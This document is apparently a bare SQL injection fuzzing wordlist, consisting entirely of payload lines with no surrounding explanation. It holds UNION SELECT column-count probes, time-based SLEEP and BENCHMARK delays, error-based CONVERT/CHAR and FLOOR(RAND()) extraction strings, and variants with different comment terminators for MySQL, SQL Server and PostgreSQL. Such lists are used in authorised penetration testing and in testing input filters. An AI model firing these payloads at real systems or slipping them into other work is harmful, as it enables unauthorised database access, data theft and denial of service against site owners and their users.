+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ UNION SELECT @@VERSION,SLEEP(5),"'3
+ UNION SELECT @@VERSION,SLEEP(5),"'3'"#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),4#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29#
+ UNION SELECT @@VERSION,SLEEP(5),USER(),BENCHMARK(1000000,MD5('A')),5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30#
+ UNION ALL SELECT USER()-- 
+ UNION ALL SELECT SLEEP(5)-- 
+ UNION ALL SELECT USER(),SLEEP(5)-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5)-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A'))-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT @@VERSION,USER(),SLEEP(5),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- 
+ UNION ALL SELECT NULL-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))-- 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))-- 
+ UNION ALL SELECT NULL#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))#
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))#
+ UNION ALL SELECT NULL 
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)))
+ AND 5650=CONVERT(INT,(UNION ALL SELECTCHAR(73)+CHAR(78)+CHAR(74)+CHAR(69)+CHAR(67)+CHAR(84)+CHAR(88)+CHAR(118)+CHAR(120)+CHAR(80)+CHAR(75)+CHAR(116)+CHAR(69)+CHAR(65)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
+ AND 5650=CONVERT(INT,(SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+(SELECT (CASE WHEN (5650=5650) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113)))
+ AND 3516=CAST((CHR(113)||CHR(106)||CHR(122)||CHR(106)||CHR(113))||(SELECT (CASE WHEN (3516=3516) THEN 1 ELSE 0 END))::text||(CHR(113)||CHR(112)||CHR(106)||CHR(107)||CHR(113)) AS NUMERIC)
+ AND (SELECT 4523 FROM(SELECT COUNT(*),CONCAT(0x716a7a6a71,(SELECT (ELT(4523=4523,1))),0x71706a6b71,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+ UNION ALL SELECT CHAR(113)+CHAR(106)+CHAR(122)+CHAR(106)+CHAR(113)+CHAR(110)+CHAR(106)+CHAR(99)+CHAR(73)+CHAR(66)+CHAR(109)+CHAR(119)+CHAR(81)+CHAR(108)+CHAR(88)+CHAR(113)+CHAR(112)+CHAR(106)+CHAR(107)+CHAR(113),NULL-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX'
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX'-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10-- 
+ UNION ALL SELECT 'INJ'||'ECT'||'XXX',2,3,4,5,6,7,8,9,10,11-- 
